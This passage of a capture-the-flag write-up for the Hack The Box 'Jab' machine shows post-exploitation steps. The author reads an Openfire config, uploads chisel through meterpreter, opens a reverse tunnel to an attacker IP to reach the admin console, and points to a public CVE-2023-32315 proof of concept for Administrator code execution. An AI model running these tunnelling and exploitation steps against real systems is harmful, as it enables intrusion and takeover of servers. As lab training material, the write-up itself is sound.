    tcp    127.0.0.1:9091        0.0.0.0:*             LISTEN       0     0      3284/openfire-service.exe
```

Browsing the computer's files, we also come across an interesting configuration file, `C:\Program Files\Openfire\conf\openfire.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!--
    This file stores bootstrap properties needed by Openfire.
    Property names must be in the format: "prop.name.is.blah=value"
    That will be stored as:
        <prop>
            <name>
                <is>
                    <blah>value</blah>
                </is>
            </name>
        </prop>

    Most properties are stored in the Openfire database. A
    property viewer and editor is included in the admin console.
-->
<!-- root element, all properties must be under this element -->
<jive> 
  <adminConsole> 
    <!-- Disable either port by setting the value to -1 -->  
    <port>9090</port>  
    <securePort>9091</securePort>  
    <interface>127.0.0.1</interface> 
  </adminConsole>  
  <locale>en</locale>  
  <!-- Network settings. By default, Openfire will bind to all network interfaces.
      Alternatively, you can specify a specific network interfaces that the server
      will listen on. For example, 127.0.0.1. This setting is generally only useful
       on multi-homed servers. -->  
  <!--
    <network>
        <interface></interface>
    </network>
    -->  
  <!--
        One time token to gain temporary access to the admin console.
    -->  
  <!--
    <oneTimeAccessToken>secretToken</oneTimeAccessToken>
    -->  
  <connectionProvider> 
    <className>org.jivesoftware.database.EmbeddedConnectionProvider</className> 
  </connectionProvider>  
  <setup>true</setup>  
  <fqdn>dc01.jab.htb</fqdn> 
</jive>
```

Now let's use `chisel` to gain access to this port.  First, I'll get the server running on my attacker machine.

```sh
┌──(pl4stic㉿shattersec)-[~/htb/jab]
└─$ chisel server --port 8000 --reverse
2025/02/05 16:06:20 server: Reverse tunnelling enabled
2025/02/05 16:06:20 server: Fingerprint XpMEJtbc5GnbG6m4Nyu2B4o2VgiPyDx6/STOki3XCkE=
2025/02/05 16:06:20 server: Listening on http://0.0.0.0:8000
```

Next, let's upload the binary to the victim machine and connect to our server.

```sh
meterpreter > upload chisel.exe
[*] Uploading  : /home/pl4stic/htb/jab/chisel.exe -> chisel.exe
[*] Uploaded 8.00 MiB of 8.78 MiB (91.1%): /home/pl4stic/htb/jab/chisel.exe -> chisel.exe
[*] Uploaded 8.78 MiB of 8.78 MiB (100.0%): /home/pl4stic/htb/jab/chisel.exe -> chisel.exe
[*] Completed  : /home/pl4stic/htb/jab/chisel.exe -> chisel.exe
meterpreter > shell
Process 5656 created.
Channel 8 created.
Microsoft Windows [Version 10.0.17763.5458]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\svc_openfire>.\chisel.exe client 10.10.14.172:8000 R:9090:localhost:9090
.\chisel.exe client 10.10.14.172:8000 R:9090:localhost:9090
2025/02/05 16:08:29 client: Connecting to ws://10.10.14.172:8000
2025/02/05 16:08:29 client: Connected (Latency 20.0236ms)
```

And now we've got access on our local machine.

![jab10](/images/jab10.png)

Also, lucky for us, the `svc_openfire` credentials from earlier work on the admin console.

### CVE-2023-32315

Doing some additional research shows OpenFire v4.7.5 might be vulnerable to [CVE-2023-32315](https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce) and exploit POC [here](https://github.com/miko550/CVE-2023-32315).  Luckily, `svc_openfire` has administrator privileges on OpenFire, so we can omit the first few steps in the POC.

![jab11](/images/jab11.png)

Once the `.jar` is uploaded, follow the steps from the POC and run whatever commands you like as Administrator. Grab the root flag.